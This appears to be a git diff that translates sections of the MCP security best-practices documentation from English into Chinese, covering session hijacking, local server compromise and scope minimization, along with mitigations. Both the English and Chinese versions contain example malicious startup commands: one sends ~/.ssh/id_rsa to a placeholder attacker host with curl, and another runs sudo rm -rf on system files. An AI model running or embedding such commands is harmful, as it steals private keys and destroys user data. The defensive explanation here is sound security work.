@@ -298,135 +298,135 @@ sequenceDiagram
 
 3. **服务器B**将事件（与会话ID关联）排入共享队列。
 4. **服务器A**使用会话ID轮询队列以获取事件并检索恶意负载。
-1. **Server A** sends the malicious payload to the client as an asynchronous or resumed response.
-1. The client receives and acts on the malicious payload, leading to potential compromise.
+5. **服务器A**将恶意负载作为异步或恢复响应发送给客户端。
+6. 客户端接收并基于恶意负载执行操作，导致潜在妥协。
 
-**Session Hijack Impersonation**
+**会话劫持冒充**
 
-1. The MCP client authenticates with the MCP server, creating a persistent session ID.
-2. The attacker obtains the session ID.
-3. The attacker makes calls to the MCP server using the session ID.
-4. MCP server does not check for additional authorization and treats the attacker as a legitimate user, allowing unauthorized access or actions.
+1. MCP客户端与MCP服务器进行身份验证，创建持久会话ID。
+2. 攻击者获得会话ID。
+3. 攻击者使用会话ID向MCP服务器发出调用。
+4. MCP服务器不检查额外授权并将攻击者视为合法用户，允许未经授权的访问或操作。
 
-#### Mitigation
+#### 缓解措施
 
-To prevent session hijacking and event injection attacks, the following mitigations should be implemented:
+为了防止会话劫持和事件注入攻击，应实施以下缓解措施：
 
-MCP servers that implement authorization **MUST** verify all inbound requests.
-MCP Servers **MUST NOT** use sessions for authentication.
+实施授权的MCP服务器**必须**验证所有入站请求。
+MCP服务器**不得**使用会话进行身份验证。
 
-MCP servers **MUST** use secure, non-deterministic session IDs.
-Generated session IDs (e.g., UUIDs) **SHOULD** use secure random number generators. Avoid predictable or sequential session identifiers that could be guessed by an attacker. Rotating or expiring session IDs can also reduce the risk.
+MCP服务器**必须**使用安全、非确定性的会话ID。
+生成的会话ID（例如，UUID）**应该**使用安全随机数生成器。避免可预测或顺序会话标识符，这些标识符可能被攻击者猜测。轮换或使会话ID过期也可以降低风险。
 
-MCP servers **SHOULD** bind session IDs to user-specific information.
-When storing or transmitting session-related data (e.g., in a queue), combine the session ID with information unique to the authorized user, such as their internal user ID. Use a key format like `<user_id>:<session_id>`. This ensures that even if an attacker guesses a session ID, they cannot impersonate another user as the user ID is derived from the user token and not provided by the client.
+MCP服务器**应该**将会话ID绑定到用户特定信息。
+在存储或传输会话相关数据（例如，在队列中）时，将会话ID与授权用户的唯一信息（如其内部用户ID）组合。使用像`<user_id>:<session_id>`这样的键格式。这确保即使攻击者猜测了会话ID，他们也无法冒充另一个用户，因为用户ID是从用户令牌派生的，而不是由客户端提供的。
 
-MCP servers can optionally leverage additional unique identifiers.
+MCP服务器可以选择利用额外的唯一标识符。
 
-### Local MCP Server Compromise
+### 本地MCP服务器妥协
 
-Local MCP servers are MCP Servers running on a user's local machine, either by the user downloading and executing a server, authoring a server themselves, or installing through a client's configuration flows. These servers may have direct access to the user's system and may be accessible to other processes running on the user's machine, making them attractive targets for attacks.
+本地MCP服务器是在用户本地机器上运行的MCP服务器，用户可以通过下载和执行服务器、自己编写服务器或通过客户端配置流程安装。这些服务器可能直接访问用户的系统，并且可能被用户机器上运行的其他进程访问，使它们成为攻击的吸引目标。
 
-#### Attack Description
+#### 攻击描述
 
-Local MCP servers are binaries that are downloaded and executed on the same machine as the MCP client. Without proper sandboxing and consent requirements in place, the following attacks become possible:
+本地MCP服务器是下载并在与MCP客户端相同机器上执行的二进制文件。如果没有适当的沙盒化和同意要求，以下攻击成为可能：
 
-1. An attacker includes a malicious "startup" command in a client configuration
-2. An attacker distributes a malicious payload inside the server itself
-3. An attacker accesses an insecure local server that's left running on localhost via DNS rebinding
+1. 攻击者在客户端配置中包含恶意"启动"命令
+2. 攻击者在服务器本身中分发恶意负载
+3. 攻击者通过DNS重新绑定访问留在localhost上运行的不安全本地服务器
 
-Example malicious startup commands that could be embedded:
+可以嵌入的恶意启动命令示例：
 
 ```bash
-# Data exfiltration
+# 数据泄露
 npx malicious-package && curl -X POST -d @~/.ssh/id_rsa https://example.com/evil-location
 
-# Privilege escalation
+# 权限提升
 sudo rm -rf /important/system/files && echo "MCP server installed!"
 ```
 
-#### Risks
+#### 风险
 
-Local MCP servers with inadequate restrictions or from untrusted sources introduce several critical security risks:
+来自不受信任来源或具有不充分限制的本地MCP服务器引入了几个关键安全风险：
 
-- **Arbitrary code execution**. Attackers can execute any command with MCP client privileges.
-- **No visibility**. Users have no insight into what commands are being executed.
-- **Command obfuscation**. Malicious actors can use complex or convoluted commands to appear legitimate.
-- **Data exfiltration**. Attackers can access legitimate local MCP servers via compromised javascript.
-- **Data loss**. Attackers or bugs in legitimate servers could lead to irrecoverable data loss on the host machine.
+- **任意代码执行**。攻击者可以使用MCP客户端权限执行任何命令。
+- **无可见性**。用户对正在执行的命令没有洞察力。
+- **命令混淆**。恶意行为者可以使用复杂或令人困惑的命令来显得合法。
+- **数据泄露**。攻击者可以通过妥协的javascript访问合法的本地MCP服务器。
+- **数据丢失**。攻击者或合法服务器中的bug可能导致主机机器上不可恢复的数据丢失。
 
-#### Mitigation
+#### 缓解措施
 
-If an MCP client supports one-click local MCP server configuration, it **MUST** implement proper consent mechanisms prior to executing commands.
+如果MCP客户端支持一键本地MCP服务器配置，它**必须**在执行命令之前实施适当的同意机制。
 
-**Pre-Configuration Consent**
+**预配置同意**
 
-Display a clear consent dialog before connecting a new local MCP server via one-click configuration. The MCP client **MUST**:
+在通过一键配置连接新本地MCP服务器之前显示清晰的同意对话框。MCP客户端**必须**：
 
-- Show the exact command that will be executed, without truncation (include arguments and parameters)
-- Clearly identify it as a potentially dangerous operation that executes code on the user's system
-- Require explicit user approval before proceeding
-- Allow users to cancel the configuration
+- 显示将要执行的确切命令，没有截断（包括参数和参数）
+- 清楚地将其识别为在用户系统上执行代码的潜在危险操作
+- 在继续之前需要明确的批准
+- 允许用户取消配置
 
-The MCP client **SHOULD** implement additional checks and guardrails to mitigate potential code execution attack vectors:
+MCP客户端**应该**实施额外的检查和护栏来缓解潜在的代码执行攻击向量：
 
-- Highlight potentially dangerous command patterns (e.g., commands containing `sudo`, `rm -rf`, network operations, file system access outside expected directories)
-- Display warnings for commands that access sensitive locations (home directory, SSH keys, system directories)
-- Warn that MCP servers run with the same privileges as the client
-- Execute MCP server commands in a sandboxed environment with minimal default privileges
-- Launch MCP servers with restricted access to the file system, network, and other system resources
-- Provide mechanisms for users to explicitly grant additional privileges (e.g., specific directory access, network access) when needed
-- Use platform-appropriate sandboxing technologies (containers, chroot, application sandboxes, etc.)
+- 突出显示潜在危险的命令模式（例如，包含`sudo`、`rm -rf`、网络操作、在预期目录之外的文件系统访问的命令）
+- 显示访问敏感位置的命令警告（主目录、SSH密钥、系统目录）
+- 警告MCP服务器以与客户端相同的权限运行
+- 在具有最小默认权限的沙盒环境中执行MCP服务器命令
+- 使用受限的文件系统、网络和其他系统资源的访问权限启动MCP服务器
+- 在需要时提供用户明确授予额外权限的机制（例如，特定目录访问、网络访问）
+- 使用平台适当的沙盒技术（容器、chroot、应用程序沙盒等）
 
-MCP servers intending for their servers to be run locally **SHOULD** implement measures to prevent unauthorized usage from malicious processes:
+打算在本地运行其服务器的MCP服务器**应该**实施措施以防止来自恶意进程的未经授权使用：
 
-- Use the `stdio` transport to limit access to just the MCP client
-- Restrict access if using an HTTP transport, such as:
-  - Require an authorization token
-  - Use unix domain sockets or other Interprocess Communication (IPC) mechanisms with restricted access
+- 使用`stdio`传输将访问限制为仅MCP客户端
+- 如果使用HTTP传输，则限制访问，例如：
+  - 需要授权令牌
+  - 使用unix域套接字或其他进程间通信（IPC）机制，具有受限访问
 
-### Scope Minimization
+### 范围最小化
 
-Poor scope design increases token compromise impact, elevates user friction, and obscures audit trails.
+糟糕的范围设计会增加令牌妥协的影响，提高用户摩擦，并模糊审计跟踪。
 
-#### Attack Description
+#### 攻击描述
 
-An attacker obtains (via log leakage, memory scraping, or local interception) an access token carrying broad scopes (`files:*`, `db:*`, `admin:*`) that were granted up front because the MCP server exposed every scope in `scopes_supported` and the client requested them all. The token enables lateral data access, privilege chaining, and difficult revocation without re-consenting the entire surface.
+攻击者通过日志泄露、内存抓取或本地拦截获得携带广泛范围（`files:*`、`db:*`、`admin:*`）的访问令牌，这些范围是预先授予的，因为MCP服务器在`scopes_supported`中公开了每个范围，而客户端请求了所有范围。该令牌启用横向数据访问、权限链接，以及在不重新同意整个表面情况下难以撤销。
 
-#### Risks
+#### 风险
 
-- Expanded blast radius: stolen broad token enables unrelated tool/resource access
-- Higher friction on revocation: revoking a max-privilege token disrupts all workflows
-- Audit noise: single omnibus scope masks user intent per operation
-- Privilege chaining: attacker can immediately invoke high-risk tools without further elevation prompts
-- Consent abandonment: users decline dialogs listing excessive scopes
-- Scope inflation blindness: lack of metrics makes over-broad requests normalised
+- 扩展爆炸半径：被盗的广泛令牌启用不相关的工具/资源访问
+- 更高的撤销摩擦：撤销最大权限令牌会中断所有工作流程
+- 审计噪音：单个综合范围掩盖每个操作的用户意图
+- 权限链接：攻击者可以立即调用高风险工具而无需进一步提升提示
+- 同意放弃：用户拒绝列出过多范围的对话框
+- 范围膨胀盲目：缺乏指标使过度广泛的请求正常化
 
-#### Mitigation
+#### 缓解措施
 
-Implement a progressive, least-privilege scope model:
+实施渐进式、最小权限范围模型：
 
-- Minimal initial scope set (e.g., `mcp:tools-basic`) containing only low-risk discovery/read operations
-- Incremental elevation via targeted `WWW-Authenticate` `scope="..."` challenges when privileged operations are first attempted
-- Down-scoping tolerance: server should accept reduced scope tokens; auth server MAY issue a subset of requested scopes
+- 最小初始范围集（例如，`mcp:tools-basic`）仅包含低风险发现/读取操作
+- 通过针对性的`WWW-Authenticate` `scope="..."`挑战在首次尝试特权操作时进行增量提升
+- 向下范围容忍：服务器应该接受减少范围的令牌；授权服务器可能发出请求范围的子集
 
-Server guidance:
+服务器指导：
 
-- Emit precise scope challenges; avoid returning the full catalog
-- Log elevation events (scope requested, granted subset) with correlation IDs
+- 发出精确的范围挑战；避免返回完整目录
+- 使用相关ID记录提升事件（请求的范围、授予的子集）
 
-Client guidance:
+客户端指导：
 
-- Begin with only baseline scopes (or those specified by initial `WWW-Authenticate`)
-- Cache recent failures to avoid repeated elevation loops for denied scopes
+- 仅以基线范围开始（或由初始`WWW-Authenticate`指定的范围）
+- 缓存最近失败以避免对拒绝范围的重复提升循环
 
-#### Common Mistakes
+#### 常见错误
 
-- Publishing all possible scopes in `scopes_supported`
-- Using wildcard or omnibus scopes (`*`, `all`, `full-access`)
-- Bundling unrelated privileges to preempt future prompts
-- Returning entire scope catalog in every challenge
-- Silent scope semantic changes without versioning
-- Treating claimed scopes in token as sufficient without server-side authorization logic
+- 在`scopes_supported`中发布所有可能的范围
+- 使用通配符或综合范围（`*`、`all`、`full-access`）
+- 捆绑不相关的权限以预先防止未来的提示
+- 在每次挑战中返回整个范围目录
+- 在没有版本控制的情况下静默更改范围语义
+- 将令牌中声明的范围视为足够的，而没有服务器端授权逻辑
 
-Proper minimization constrains compromise impact, improves audit clarity, and reduces consent churn.
+适当的最小化约束妥协影响，提高审计清晰度，并减少同意流失。
